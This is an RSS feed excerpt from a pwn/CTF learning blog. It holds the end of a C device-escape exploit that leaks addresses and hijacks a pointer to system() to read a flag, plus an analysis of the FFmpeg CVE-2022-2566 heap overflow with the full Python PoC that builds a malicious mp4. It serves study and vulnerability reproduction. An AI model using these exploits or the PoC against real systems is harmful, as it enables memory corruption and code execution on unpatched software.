<a class="sourceLine" id="cb14-200" title="200">    fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb14-201" title="201">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb14-202" title="202">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb14-203" title="203">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-204" title="204">    }</a>
<a class="sourceLine" id="cb14-205" title="205">    get_pages();</a>
<a class="sourceLine" id="cb14-206" title="206"></a>
<a class="sourceLine" id="cb14-207" title="207">    printf(<span class="st">&quot;init mmio:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-208" title="208">    init_mmio();</a>
<a class="sourceLine" id="cb14-209" title="209"></a>
<a class="sourceLine" id="cb14-210" title="210">    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-211" title="211">    <span class="cf">if</span> (userbuf == MAP_FAILED)</a>
<a class="sourceLine" id="cb14-212" title="212">        Err(<span class="st">&quot;mmap userbuf&quot;</span>);</a>
<a class="sourceLine" id="cb14-213" title="213">    mlock(userbuf, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-214" title="214">    phy_userbuf = va2pa(userbuf);</a>
<a class="sourceLine" id="cb14-215" title="215">    printf(<span class="st">&quot;userbuf va: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, userbuf);</a>
<a class="sourceLine" id="cb14-216" title="216">    printf(<span class="st">&quot;userbuf pa: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, phy_userbuf);</a>
<a class="sourceLine" id="cb14-217" title="217"></a>
<a class="sourceLine" id="cb14-218" title="218">    memset(buf0, <span class="ch">&#39;a&#39;</span>, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-219" title="219">    memset(buf1, <span class="ch">&#39;a&#39;</span>, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-220" title="220">    printf(<span class="st">&quot;[++++] 0x%lx %p</span><span class="sc">\n</span><span class="st">&quot;</span>, buf0, buf0);</a>
<a class="sourceLine" id="cb14-221" title="221">    printf(<span class="st">&quot;phy_buf0: 0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, phy_buf0);</a>
<a class="sourceLine" id="cb14-222" title="222"></a>
<a class="sourceLine" id="cb14-223" title="223">    printf(<span class="st">&quot;leak addr:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-224" title="224">    *(<span class="dt">uint64_t</span>*)(userbuf) = phy_userbuf;</a>
<a class="sourceLine" id="cb14-225" title="225">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>) = <span class="bn">0x1000</span>;</a>
<a class="sourceLine" id="cb14-226" title="226">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-227" title="227">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0xff8</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-228" title="228">    set_write(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-229" title="229">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-230" title="230">    <span class="cf">for</span>(<span class="dt">int</span> i=<span class="dv">0</span>; i&lt;<span class="dv">17</span>; i++){</a>
<a class="sourceLine" id="cb14-231" title="231">        *(<span class="dt">uint64_t</span>*)(userbuf+i*<span class="bn">0x18</span>) = phy_userbuf;</a>
<a class="sourceLine" id="cb14-232" title="232">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>+i*<span class="bn">0x18</span>) = <span class="bn">0x1040</span>;</a>
<a class="sourceLine" id="cb14-233" title="233">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-234" title="234">    }</a>
<a class="sourceLine" id="cb14-235" title="235">    set_read(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-236" title="236">    <span class="co">//sleep(3);</span></a>
<a class="sourceLine" id="cb14-237" title="237"></a>
<a class="sourceLine" id="cb14-238" title="238">    <span class="dt">size_t</span> buf_addr = *(<span class="dt">size_t</span>*)(buf1+<span class="bn">0x18</span>)+<span class="bn">0xa00</span>;</a>
<a class="sourceLine" id="cb14-239" title="239">    <span class="dt">size_t</span> t_addr = *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x10</span>);</a>
<a class="sourceLine" id="cb14-240" title="240">    printf(<span class="st">&quot;timer_addr: 0x%llx 0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, buf_addr, t_addr);</a>
<a class="sourceLine" id="cb14-241" title="241">    <span class="dt">size_t</span> system_plt = t_addr - <span class="bn">0x4dce80</span> + <span class="bn">0x2c2180</span>;</a>
<a class="sourceLine" id="cb14-242" title="242">    printf(<span class="st">&quot;system_plt: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, system_plt);</a>
<a class="sourceLine" id="cb14-243" title="243"></a>
<a class="sourceLine" id="cb14-244" title="244">    printf(<span class="st">&quot;write ptr:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-245" title="245">    <span class="cf">for</span>(<span class="dt">int</span> i=<span class="dv">0</span>; i&lt;<span class="dv">17</span>; i++){</a>
<a class="sourceLine" id="cb14-246" title="246">        *(<span class="dt">uint64_t</span>*)(userbuf+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-247" title="247">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>+i*<span class="bn">0x18</span>) = <span class="bn">0x1020</span>;</a>
<a class="sourceLine" id="cb14-248" title="248">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-249" title="249">    }</a>
<a class="sourceLine" id="cb14-250" title="250">    *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x10</span>) = system_plt;</a>
<a class="sourceLine" id="cb14-251" title="251">    *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x18</span>) = buf_addr;</a>
<a class="sourceLine" id="cb14-252" title="252">    <span class="dt">char</span> *command=<span class="st">&quot;cat ./flag</span><span class="sc">\x00</span><span class="st">&quot;</span>;</a>
<a class="sourceLine" id="cb14-253" title="253">    memcpy(buf0,command,strlen(command));</a>
<a class="sourceLine" id="cb14-254" title="254">    printf(<span class="st">&quot;cover system addr</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-255" title="255">    set_read_write(<span class="bn">0x11</span>);</a>
<a class="sourceLine" id="cb14-256" title="256">    printf(<span class="st">&quot;trigger vul</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-257" title="257">    set_read(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-258" title="258">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-259" title="259">}</a></code></pre></div>]]></description>
    <pubDate>Tue, 8 Nov 2022 17:20:42 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[Mark's blog]]></title>
    <link>https://blog.mark0519.com/#//#/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/README</guid>
    <description><![CDATA[<h1 id="marks-blog">Mark’s blog</h1>
<blockquote>
<p>Live long and Pwn</p>
</blockquote>
<p>Pwn learner 的互联网自留地</p>
<h2 id="cve-复现分析">CVE 复现&amp;分析</h2>
<ul>
<li><strong>[22/09/29]</strong> <a href="/220929-CVE_2016_5195">CVE-2016-5195</a></li>
<li><strong>[22/10/20]</strong> <a href="/221020-CVE_2022_2566">CVE-2022-2566</a></li>
</ul>]]></description>
    <pubDate>Thu, 20 Oct 2022 16:11:27 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[CVE-2022-2566 分析和复现]]></title>
    <link>https://blog.mark0519.com/#//#/221020-CVE_2022_2566</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/221020-CVE_2022_2566</guid>
    <description><![CDATA[<h1 id="cve-2022-2566-分析和复现">CVE-2022-2566 分析和复现</h1>
<blockquote>
<p>FFmpeg v5.1 堆越界内存写入</p>
</blockquote>
<h2 id="x00-背景">0x00 背景</h2>
<p><code>FFmpeg</code> https://www.ffmpeg.org/</p>
<p>它视频处理最常用的开源软件。它功能强大，用途广泛，大量用于视频网站和商业软件（比如 Youtube 和 iTunes），也是许多音频和视频格式的标准编码/解码实现。</p>
<p>在 <code>libavformat/mov.c</code>中发现了影响 FFmpeg 自 5.1 版或提交 ab77b878f1205225c6de1370fb0e998dbcc8bc69 的堆越界写入。</p>
<p>Google的分析：<a href="https://github.com/google/security-research/security/advisories/GHSA-vhxg-9wfx-7fcj">FFmpeg: Heap Out-Of-Bounds Write in build_open_gop_key_points · Advisory · google/security-research (github.com)</a></p>
<p>该漏洞被定位是高危漏洞（<em>High</em>），攻击者可以通过恶意 mp4 文件导致远程代码执行（RCE）。</p>
<h2 id="x01-漏洞分析">0x01 漏洞分析</h2>
<p>根据CVE描述，可以知道漏洞在 ab77b878f1205225c6de1370fb0e998dbcc8bc69 提交中引入。</p>
<p>而对应的修复commit为：6f53f0d09ea4c9c7f7354f018a87ef840315207d。</p>
<p>对应的修复：</p>
<p><a href="https://github.com/FFmpeg/FFmpeg/commit/6f53f0d09ea4c9c7f7354f018a87ef840315207d">avformat/mov: Check count sums in build_open_gop_key_points() · FFmpeg/FFmpeg@6f53f0d (github.com)</a></p>
<figure>
<img src="https://pic1.imgdb.cn/item/634fc0f416f2c2beb16005d9.png" alt="fix" /><figcaption>fix</figcaption>
</figure>
<p>可以看到关键代码为：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb1-2" title="2">        sc-&gt;sample_offsets_count += sc-&gt;ctts_data[i].count;</a></code></pre></div>
<p>而变量<code>sc-&gt;sample_offsets_count</code>被定义为<code>int</code></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1"><span class="dt">int</span> sample_offsets_count;</a></code></pre></div>
<p>所以<code>sc-&gt;sample_offsets_count</code>为8字节数，如果最大值超过<code>INT_MAX</code>则会发生整数溢出。</p>
<p>这个整数溢出会影响接下来malloc的申请：</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1">sc-&gt;sample_offsets = av_calloc(sc-&gt;sample_offsets_count, <span class="kw">sizeof</span>(*sc-&gt;sample_offsets));</a></code></pre></div>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"><span class="dt">void</span> *av_calloc(<span class="dt">size_t</span> nmemb, <span class="dt">size_t</span> size) av_malloc_attrib av_alloc_size(<span class="dv">1</span>, <span class="dv">2</span>);</a></code></pre></div>
<p><img src="https://pic1.imgdb.cn/item/634ff67a16f2c2beb1bd971d.png" /></p>
<p>如果出现整数溢出导致<code>sc-&gt;sample_offsets_count == 0</code>就会导致<code>av_calloc</code>申请最小的chunk</p>
<p>也就是<code>sc-&gt;sample_offsets</code>会指向一个0x20的chunk</p>
<p>之后会把每个ctts的duration写入这个chunk中：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb5-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb5-2" title="2">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sc-&gt;ctts_data[i].count; j++)</a>
<a class="sourceLine" id="cb5-3" title="3">             sc-&gt;sample_offsets[k++] = sc-&gt;ctts_data[i].duration;</a></code></pre></div>
<p>如果<code>sc-&gt;ctts_data[i].duration</code>过长，就会产生堆溢出。</p>
<h2 id="x02-poc调试">0x02 POC调试</h2>
<p>这里给出Google安全研究员提供的POC</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" title="1"><span class="co">#!/usr/bin/env python3</span></a>
<a class="sourceLine" id="cb6-2" title="2"><span class="im">import</span> struct</a>
<a class="sourceLine" id="cb6-3" title="3"><span class="im">import</span> sys</a>
<a class="sourceLine" id="cb6-4" title="4"></a>
<a class="sourceLine" id="cb6-5" title="5">HEVC_NAL_CRA_NUT <span class="op">=</span> <span class="dv">21</span></a>
<a class="sourceLine" id="cb6-6" title="6"></a>
<a class="sourceLine" id="cb6-7" title="7"></a>
<a class="sourceLine" id="cb6-8" title="8"><span class="kw">def</span> atom(tag, chunk):</a>
<a class="sourceLine" id="cb6-9" title="9">  data <span class="op">=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bu">len</span>(chunk) <span class="op">+</span> <span class="dv">8</span>)</a>
<a class="sourceLine" id="cb6-10" title="10">  data <span class="op">+=</span> tag</a>
<a class="sourceLine" id="cb6-11" title="11">  data <span class="op">+=</span> chunk</a>
<a class="sourceLine" id="cb6-12" title="12">  <span class="cf">return</span> data</a>
<a class="sourceLine" id="cb6-13" title="13"></a>
<a class="sourceLine" id="cb6-14" title="14"></a>
<a class="sourceLine" id="cb6-15" title="15"><span class="kw">def</span> atom_ftyp():</a>
<a class="sourceLine" id="cb6-16" title="16">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-17" title="17">  data <span class="op">+=</span> b<span class="st">&#39;mp42&#39;</span>  <span class="co"># type</span></a>
<a class="sourceLine" id="cb6-18" title="18">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;L&#39;</span>, <span class="dv">0</span>)  <span class="co"># minor_ver</span></a>
<a class="sourceLine" id="cb6-19" title="19">  <span class="cf">return</span> atom(b<span class="st">&#39;ftyp&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-20" title="20"></a>
<a class="sourceLine" id="cb6-21" title="21"></a>
<a class="sourceLine" id="cb6-22" title="22"><span class="kw">def</span> atom_moov(nested):</a>
<a class="sourceLine" id="cb6-23" title="23">  <span class="cf">return</span> atom(b<span class="st">&#39;moov&#39;</span>, nested)</a>
<a class="sourceLine" id="cb6-24" title="24"></a>
<a class="sourceLine" id="cb6-25" title="25"></a>
<a class="sourceLine" id="cb6-26" title="26"><span class="kw">def</span> atom_trak(nested):</a>
<a class="sourceLine" id="cb6-27" title="27">  <span class="cf">return</span> atom(b<span class="st">&#39;trak&#39;</span>, nested)</a>
<a class="sourceLine" id="cb6-28" title="28"></a>
<a class="sourceLine" id="cb6-29" title="29"></a>
<a class="sourceLine" id="cb6-30" title="30"><span class="kw">def</span> atom_hev1():</a>
<a class="sourceLine" id="cb6-31" title="31">  <span class="cf">return</span> atom(b<span class="st">&#39;hev1&#39;</span>, b<span class="st">&#39;&#39;</span>)</a>
<a class="sourceLine" id="cb6-32" title="32"></a>
<a class="sourceLine" id="cb6-33" title="33"></a>
<a class="sourceLine" id="cb6-34" title="34"><span class="kw">def</span> atom_stsd(nested):</a>
<a class="sourceLine" id="cb6-35" title="35">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-36" title="36">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-37" title="37">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-38" title="38">  data <span class="op">+=</span> nested</a>
<a class="sourceLine" id="cb6-39" title="39">  data <span class="op">+=</span> b<span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span> <span class="op">*</span> <span class="dv">70</span></a>
<a class="sourceLine" id="cb6-40" title="40">  <span class="cf">return</span> atom(b<span class="st">&#39;stsd&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-41" title="41"></a>
<a class="sourceLine" id="cb6-42" title="42"></a>
<a class="sourceLine" id="cb6-43" title="43"><span class="kw">def</span> atom_sgpd():</a>
<a class="sourceLine" id="cb6-44" title="44">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-45" title="45">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-46" title="46">  data <span class="op">+=</span> b<span class="st">&#39;sync&#39;</span>  <span class="co"># grouping_type</span></a>
<a class="sourceLine" id="cb6-47" title="47">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># default_length</span></a>
<a class="sourceLine" id="cb6-48" title="48">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># entry_count</span></a>
<a class="sourceLine" id="cb6-49" title="49">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-50" title="50">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;B&#39;</span>, HEVC_NAL_CRA_NUT)  <span class="co"># nal_unit_type</span></a>
<a class="sourceLine" id="cb6-51" title="51">  <span class="cf">return</span> atom(b<span class="st">&#39;sgpd&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-52" title="52"></a>
<a class="sourceLine" id="cb6-53" title="53"></a>
<a class="sourceLine" id="cb6-54" title="54"><span class="kw">def</span> atom_sbgp():</a>
<a class="sourceLine" id="cb6-55" title="55">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-56" title="56">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-57" title="57">  data <span class="op">+=</span> b<span class="st">&#39;sync&#39;</span>  <span class="co"># grouping_type</span></a>
<a class="sourceLine" id="cb6-58" title="58">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">2</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-59" title="59">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-60" title="60">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># sample_count</span></a>
<a class="sourceLine" id="cb6-61" title="61">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># group_description_index</span></a>
<a class="sourceLine" id="cb6-62" title="62">  <span class="co"># entry 1</span></a>
<a class="sourceLine" id="cb6-63" title="63">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0xffffffff</span>)  <span class="co"># sample_count</span></a>
<a class="sourceLine" id="cb6-64" title="64">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># group_description_index</span></a>
<a class="sourceLine" id="cb6-65" title="65">  <span class="cf">return</span> atom(b<span class="st">&#39;sbgp&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-66" title="66"></a>
<a class="sourceLine" id="cb6-67" title="67"></a>
<a class="sourceLine" id="cb6-68" title="68"><span class="kw">def</span> atom_ctts():</a>
<a class="sourceLine" id="cb6-69" title="69">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-70" title="70">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-71" title="71">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">4</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-72" title="72">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-73" title="73">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-74" title="74">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-75" title="75">  <span class="co"># entry 1</span></a>
<a class="sourceLine" id="cb6-76" title="76">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-77" title="77">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-78" title="78">  <span class="co"># entry 2</span></a>
<a class="sourceLine" id="cb6-79" title="79">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-80" title="80">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-81" title="81">  <span class="co"># entry 3</span></a>
<a class="sourceLine" id="cb6-82" title="82">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-83" title="83">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-84" title="84">  <span class="cf">return</span> atom(b<span class="st">&#39;ctts&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-85" title="85"></a>
<a class="sourceLine" id="cb6-86" title="86"></a>
<a class="sourceLine" id="cb6-87" title="87"><span class="kw">def</span> main():</a>
<a class="sourceLine" id="cb6-88" title="88">  <span class="cf">if</span> <span class="bu">len</span>(sys.argv) <span class="op">!=</span> <span class="dv">2</span>:</a>
<a class="sourceLine" id="cb6-89" title="89">    <span class="bu">print</span>(<span class="st">&#39;Usage: poc.py out.mp4&#39;</span>)</a>
<a class="sourceLine" id="cb6-90" title="90">    <span class="cf">return</span> <span class="dv">-1</span></a>
<a class="sourceLine" id="cb6-91" title="91"></a>
<a class="sourceLine" id="cb6-92" title="92">  data <span class="op">=</span> atom_ftyp() <span class="op">+</span> atom_moov(</a>
<a class="sourceLine" id="cb6-93" title="93">      atom_trak(</a>
<a class="sourceLine" id="cb6-94" title="94">          atom_stsd(atom_hev1()) <span class="op">+</span> atom_sgpd() <span class="op">+</span> atom_sbgp()</a>
<a class="sourceLine" id="cb6-95" title="95">          <span class="op">+</span> atom_ctts()</a>
<a class="sourceLine" id="cb6-96" title="96">      ))</a>
<a class="sourceLine" id="cb6-97" title="97"></a>
<a class="sourceLine" id="cb6-98" title="98">  <span class="bu">open</span>(sys.argv[<span class="dv">1</span>], <span class="st">&#39;wb&#39;</span>).write(data)</a>
<a class="sourceLine" id="cb6-99" title="99"></a>
<a class="sourceLine" id="cb6-100" title="100"></a>
<a class="sourceLine" id="cb6-101" title="101"><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</a>
<a class="sourceLine" id="cb6-102" title="102">  main()</a></code></pre></div>
<p>这里可以看到，生成的这个mp4文件中存在4个<code>ctts</code>结构体，每个的count和duration为：</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb7-1" title="1">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb7-2" title="2">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a></code></pre></div>
<p>也就是会使得<code>sc-&gt;ctts_data[i].count == 0x40000000</code></p>
<p>而我们一共有4个<code>ctts</code>结构，也就是<code>0x40000000*4 = 0x100000000</code></p>
<p>而<code>INT(0x100000000) == 0</code>，所以这个运行这个poc得到的mp4文件就会使得<code>ffmpeg</code>出现整数溢出问题。</p>
<p>我们编译一份存在漏洞版本的<code>ffmpeg</code>，编译之后得到的二进制文件<code>ffmpeg_g</code>就是有GDB调试符号的程序。</p>
<p>在<code>build_open_gop_key_points()</code>函数打断点：</p>
<p><img src="https://pic1.imgdb.cn/item/634ff85516f2c2beb1c0bf1a.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffd0716f2c2beb1c8b975.png" /></p>
<p>可以看到：</p>
<p><img src="https://pic1.imgdb.cn/item/634ffd2116f2c2beb1c8e8e0.png" /></p>
<p>之后运行这个for循环：</p>
<p><img src="https://pic1.imgdb.cn/item/634ffd6016f2c2beb1c95a26.png" /></p>
<p>也就是整数溢出使得这个值为0，也就是<code>av_calloc</code>会申请出一个0x20的chunk</p>
<p><img src="https://pic1.imgdb.cn/item/634ffe4116f2c2beb1caf53d.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffeac16f2c2beb1cbafe2.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffeb516f2c2beb1cbbf45.png" /></p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb8-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb8-2" title="2">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sc-&gt;ctts_data[i].count; j++)</a>
<a class="sourceLine" id="cb8-3" title="3">             sc-&gt;sample_offsets[k++] = sc-&gt;ctts_data[i].duration;</a></code></pre></div>
<p>但是由于<code>sc-&gt;ctts_data[i].count == 0x40000000</code>，所以会直接覆盖接下来的<code>0x40000000*4</code>个字节的堆区，产生堆溢出Heap overflow</p>
<h2 id="x03-利用">0x03 利用</h2>
<blockquote>
<p>暂时没有想到好的利用方法，，，，</p>
</blockquote>]]></description>
    <pubDate>Thu, 20 Oct 2022 16:11:27 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[赛题复现]]></title>
    <link>https://blog.mark0519.com/#//#/reproduce/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/reproduce/README</guid>
    <description><![CDATA[<h1 id="赛题复现">赛题复现</h1>
<blockquote>
<p>青山依旧在，几度夕阳红。</p>
</blockquote>
<h2 id="pwnhub.cn">pwnhub.cn</h2>
<ul>
<li><strong>[22/4/13]</strong> [PWN] <a href="/reproduce/220413-canyouseeme">can_you_see_me</a></li>
</ul>
<h2 id="aaactf2022">AAACTF2022</h2>
<ul>
<li><strong>[22/7/17]</strong> [PWN] <a href="/reproduce/220717-MasterOfDNS">Master of DNS</a></li>
</ul>
<h2 id="space-2022">5Space 2022</h2>
<ul>
<li><strong>[22/9/20]</strong> [PWN] <a href="/reproduce/220920-toolkit">toolkit</a></li>
</ul>
<h2 id="sekai-ctf-2022">SEKAI CTF 2022</h2>
<ul>
<li><strong>[22/10/11]</strong> [PWN] <a href="/reproduce/221011-setup">setup</a></li>
</ul>
<h2 id="其他">其他</h2>
<ul>
<li><p><strong>[22/7/10]</strong> [PWN] <a href="/reproduce/220710-one">one</a></p></li>
<li><p><strong>[22/7/10]</strong> [PWN] <a href="/reproduce/220710-MuteBuild">Mute&amp;Blind</a></p></li>
</ul>]]></description>
    <pubDate>Tue, 11 Oct 2022 16:59:01 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[setup]]></title>
    <link>https://blog.mark0519.com/#//#/reproduce/221011-setup</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/reproduce/221011-setup</guid>
    <description><![CDATA[<h1 id="setup">setup</h1>
<blockquote>
<p>Category: PWN</p>
<p>Date: 2022/10/11</p>
<p>Authorship: SEKAI CTF 2022</p>
</blockquote>
<h2 id="x00-64位下的int-0x80">0x00 64位下的int 0x80</h2>
<p>在64位程序下，使用系统调用的方法是syscall，但是可以直接使用int 0x80来调用32位的系统调用号</p>
<p>比较常见的几个：</p>
<table>
<thead>
<tr class="header">
<th>sys code</th>
<th>x64 (64 bits)</th>
<th>x86 (32 bits)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0x05</td>
<td>fstat</td>
<td>open</td>
</tr>
<tr class="even">
<td>0xc0</td>
<td>lgetxattr</td>
<td>mmap2</td>
</tr>
<tr class="odd">
<td>0x8d</td>
<td>getpriority</td>
<td>getents</td>
</tr>
</tbody>
</table>
<h2 id="x01-题目分析">0x01 题目分析</h2>
<p><img src="https://pic1.imgdb.cn/item/6345308d16f2c2beb13e47f6.png" /></p>
